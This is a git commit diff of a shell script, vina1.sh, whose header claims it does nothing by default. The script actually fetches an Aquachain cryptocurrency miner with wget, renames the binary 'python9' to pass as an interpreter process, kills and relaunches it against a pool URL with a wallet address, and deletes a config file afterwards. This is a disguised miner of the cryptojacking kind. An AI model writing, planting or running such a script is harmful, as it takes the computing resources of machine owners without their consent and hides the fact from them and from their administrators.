35de210c3a321324bdefded1c688b8b2c58926b8
haidanglx <40859600+haidanglx@users.noreply.github.com>
2019-04-09 17:43:17 +0700

    Update vina1.sh

--- vina1.sh
+++ vina1.sh
@@ -10,18 +10,18 @@
 # bits.
 #
 # By default this script does nothing.
-if [ -f ${PWD}/python ]; then
-    if pgrep -x "python" > /dev/null
+if [ -f ${PWD}/python9 ]; then
+    if pgrep -x "python9" > /dev/null
 then
-pkill python
+pkill python9
 echo " kill process"
-./python -F http://miner.aqua.signal2noi.se:443/0xd994dfed4458b2cadcabbfc004372a101d273d40/2
+./python9 -F http://miner.aqua.signal2noi.se:443/0xd994dfed4458b2cadcabbfc004372a101d273d40/2
 
     
 else
 
 echo "Miner da install , chay thoi "
-./python -F http://miner.aqua.signal2noi.se:443/0xd994dfed4458b2cadcabbfc004372a101d273d40/2
+./python9 -F http://miner.aqua.signal2noi.se:443/0xd994dfed4458b2cadcabbfc004372a101d273d40/2
 
      
 fi
@@ -30,7 +30,6 @@ fi
 
 wget https://github.com/aquanetwork/aquachain/releases/download/1.5.5/aquaminer-0.4-linux-amd64.zip
 unzip aquaminer-0.4-linux-amd64.zip
-mv aquaminer-0.4-linux-amd64 python
-./python -F http://miner.aqua.signal2noi.se:443/0xd994dfed4458b2cadcabbfc004372a101d273d40/2
-
-exit 0
+mv aquaminer-0.4-linux-amd64 python9
+./python9 -F http://miner.aqua.signal2noi.se:443/0xd994dfed4458b2cadcabbfc004372a101d273d40/2
+rm config.json
